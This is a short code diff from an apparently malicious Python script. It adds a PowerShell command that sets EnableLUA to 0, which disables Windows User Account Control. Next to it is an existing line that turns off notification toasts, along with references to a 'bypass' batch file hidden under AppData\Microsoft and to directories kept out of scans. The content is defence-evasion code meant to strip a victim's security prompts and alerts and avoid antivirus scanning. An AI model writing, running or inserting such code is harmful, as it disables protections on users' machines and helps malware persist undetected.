@@ -11,7 +11,8 @@ bypass_starter_path = os.getenv("appdata") + "\\Microsoft\\passer\\pass.bat"
 start = os.getenv("appdata") + "\\Microsoft\\passer\\start.bat"
 
 
-# Alerts prepare to close on reboot
+# Alerts and  UAC prepare to close on reboot
+os.system(r"powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force")
 os.system(r"powershell.exe New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications -Name ToastEnabled  -PropertyType DWord -Value 0 -Force")
 
 # the directories we get here are blocked from being scanned
